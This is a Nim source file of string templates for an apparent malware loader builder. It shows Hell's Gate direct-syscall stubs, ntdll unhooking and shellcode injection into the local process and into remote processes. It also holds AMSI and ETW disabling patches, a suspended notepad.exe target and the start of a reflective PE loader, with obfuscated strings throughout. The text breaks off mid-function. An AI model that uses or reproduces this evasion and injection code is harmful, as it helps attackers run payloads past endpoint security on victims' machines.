import strformat
import strutils

let HellsgateDInvokeBaseStub * = """

const
  KERNEL32_DLL* = obf("kernel32.dll")

type
  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}

const
  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
  OpenProcess_HASH * = obf("OpenProcess")

var MyGetCurrentProcess*: GetCurrentProcess_t
var MyGetCurrentProcessId*: GetCurrentProcessId_t
var MyOpenProcess*: OpenProcess_t

MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))

MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))

MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))

"""

let HellsgateAllocDelegate*  = """

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
  ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
"""

let HellsgateNtOpenProcessDelegate*  = """

proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
  ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)

"""

let HellsgateWriteDelegate*  = """


proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
  ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)

"""

let HellsgateProtectDelegate*  = """


proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
  ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)

"""

let HellsgateNtCreateThreadExDelegate*  = """

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
  ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)

"""

let HellsgateNtCloseDelegate*  = """


proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
  ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)

"""

let HellsgateUnhookStub * = """

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = MyGetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  var status = 0
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          if getSyscall(ntProtectTable):              
            syscall = ntProtectTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
            return false
          if getSyscall(ntWriteTable):
            syscall = ntWriteTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
          if status != 0:
            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
            return false
          if getSyscall(ntProtectTable):              
            syscall = ntProtectTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
            return false
  if getSyscall(ntCloseTable):              
    syscall = ntCloseTable.wSysCall
  else:
    echo obf("[-] Failed to find opcode for NtClose")
  status = NtClose(processH)
  status = NtClose(ntdllFile)
  status = NtClose(ntdllMapping)
  discard MyFreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

"""

let HellsgateLocalInjectStub*  = """
                

proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =

    when defined(amd64):

        let tProcess = MyGetCurrentProcessId()
        var pHandle: HANDLE = MyGetCurrentProcess()
        
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)


        if getSyscall(ntAllocTable):
                
            syscall = ntAllocTable.wSysCall
            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
            if not NT_SUCCESS(status):
                echo obf("[-] Failed to allocate memory.")
            else:
                echo obf("[+] Allocated a page of memory with RWX perms")
        else:
            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

        var 
            ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
            ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
            bytesWritten: SIZE_T

        if getSyscall(ntWriteTable):

            syscall = ntWriteTable.wSysCall
            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

            if not NT_SUCCESS(status):
                echo obf("[-] Failed to write memory.")
            else:
                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                
               
        else:
            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
        let f = cast[proc(){.nimcall.}](buffer)
        f()

when isMainModule:
     pwndemHellsGateLike(dectext)
"""

let HellsgateRemotePatchAMSIStub* = """

proc remoteLoadLib(var processID: DWORD): void =

   
    # C:\windows\system32\amsi.dll
    var shellcode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        addr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    
    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
 
    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        pfnThreadRtn,
        rPtr, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

    var oldProtect: PDWORD = nil
    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
    echo $GetLastError()
    echo status

when isMainModule:
    remoteLoadLib(remoteProcID)

proc RemotePatchAmsi(hProcss :HANDLE): bool =

    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get amsi.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled

    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
        echo obf("Failed to write process memory")
        return disabled
    else:
        disabled = true
    return disabled

when isMainModule:
    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchAmsi(hProcams)
    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

"""

let HellsgateRemotePatchETWStub* = """

proc remoteLoadLib(var processID: DWORD): void =

    # C:\windows\system32\ntdll.dll
    var shellcode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]



    echo "[*] Target Process: ", processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        addr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    
    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
 
    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        pfnThreadRtn,
        rPtr, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

    var oldProtect: PDWORD = nil
    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
    echo $GetLastError()
    echo status

when isMainModule:
    remoteLoadLib(remoteProcID)

proc RemotePatchEtw(hProcess : HANDLE) : bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get ntdll.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
        echo obf("Failed to write process memory")
        return disabled
    else:
        disabled = true
    return disabled

when isMainModule:
    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchEtw(hProcetw)
    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"

"""

let HellsgateAMSIPatchStub*  = """

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    amsi = MyLoadLibraryA(obf("amsi.dll"))
    if (amsi == 0):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = MyGetCurrentProcess()
        
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall AMSI patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"


"""

let HellsgateETWPatchStub*  = """

proc Patchntdll(): bool =
    var
        ntdll: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    ntdll = MyLoadLibraryA(obf("ntdll"))
    if (ntdll == 0):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = MyGetCurrentProcess()
        
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall ETW patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"

"""

let HellsgateNotepadProcIDStub * = """

# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
let tProcess = startProcess(obf("notepad.exe"))
tProcess.suspend() # That's handy!
tProcess.close()

echo obf("[*] Target Process: "), tProcess.processID
var remoteProcID = DWORD(tProcess.processID)

"""

let HellsShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let HellsShellcoderemoteinjectStub * = """
    
    let tProcess2 = MyGetCurrentProcessId()
    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)


    var oldProtection: DWORD = 0


    var status: NTSTATUS
    var success: BOOL

    if getSyscall(ntOpenTable):
        syscall = ntOpenTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtOpenProcess")
    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    if getSyscall(ntAllocTable):
        syscall = ntAllocTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)

    var bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):
        syscall = ntWriteTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    if getSyscall(ntCreateTable):
        syscall = ntCreateTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL)

    if getSyscall(ntCloseTable):
        syscall = ntCloseTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtClose")

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let HellsShellcoderemoteinjectStub_customprocfirst * = fmt"""

var remoteProcID: DWORD = 0

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

var processID: DWORD
var found: bool = false

"""

let HellsShellcoderemoteinjectStub_customprocID * = """

for m in remoteprocesses:
    if found == true: continue
    echo obf("Checking: ") & $m
    processID = FindPidByName(m)
    if (processID):
        found = true

echo obf("[*] Target Process: "), processID
remoteProcID = processID

"""

let HellsShellcoderemoteinjectStub_customprocthird * = fmt"""
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""

let HellsPELoadStub * = """

from winim import size_t

proc getNtHdrs*(pe_buffer: ptr BYTE): ptr BYTE =
    if pe_buffer == nil:
      return nil
    var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
    if idh.e_magic != IMAGE_DOS_SIGNATURE:
      return nil
    let kMaxOffset: LONG = 1024
    var pe_offset: LONG = idh.e_lfanew
    if pe_offset > kMaxOffset:
      return nil
    var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
        cast[ptr BYTE](pe_buffer) + pe_offset))
    if inh.Signature != IMAGE_NT_SIGNATURE:
      return nil
    return cast[ptr BYTE](inh)

proc getPeDir*(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
    if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
      return nil
    var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
    if nt_headers == nil:
      return nil
    var peDir: ptr IMAGE_DATA_DIRECTORY = nil
    var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
    peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
    if peDir.VirtualAddress == 0:
      return nil
    return peDir

type
    BASE_RELOCATION_ENTRY* {.bycopy.} = object
      Offset* {.bitsize: 12.}: WORD
      Type* {.bitsize: 4.}: WORD


const
    RELOC_32BIT_FIELD* = 3

proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;moduleSize: SIZE_T): bool =
    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_BASERELOC)
    if relocDir == nil:
      return false
    var maxSize: csize_t = csize_t(relocDir.Size)
    var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
    var reloc: ptr IMAGE_BASE_RELOCATION = nil
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      reloc = cast[ptr IMAGE_BASE_RELOCATION]((
          size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
      if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
        break
      var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
          csize_t(sizeof((BASE_RELOCATION_ENTRY)))
      var page: csize_t = csize_t(reloc.VirtualAddress)
      var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
          cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
      var i: csize_t = 0
      while i < entriesNum:
        var offset: csize_t = entry.Offset
        var entryType: csize_t = entry.Type
        var reloc_field: csize_t = page + offset
        if entry == nil or entryType == 0:
          break
        if entryType != RELOC_32BIT_FIELD:
          return false
        if size_t(reloc_field) >= moduleSize:
          return false
        var relocateAddr: ptr csize_t = cast[ptr csize_t]((
            cast[size_t](modulePtr) + size_t(reloc_field)))
        (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
        entry = cast[ptr BASE_RELOCATION_ENTRY]((
            cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
        inc(i)
      inc(parsedSize, reloc.SizeOfBlock)
    return parsedSize != 0

proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk

proc fixIAT*(modulePtr: PVOID): bool =
    var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_IMPORT)
    if importsDir == nil:
      return false
    var maxSize: csize_t = cast[csize_t](importsDir.Size)
    var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
    var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
          impAddr + parsedSize + cast[uint64](modulePtr)))
      
      if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
        break
      var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
      var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
      var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
      if thunk_addr == 0:
        thunk_addr = csize_t(lib_desc.FirstThunk)
      var offsetField: csize_t = 0
      var offsetThunk: csize_t = 0
      while true:
        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetField + call_via))
        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
        var boolvar: bool
        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
          boolvar = true
        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
          boolvar = true
        if (boolvar):
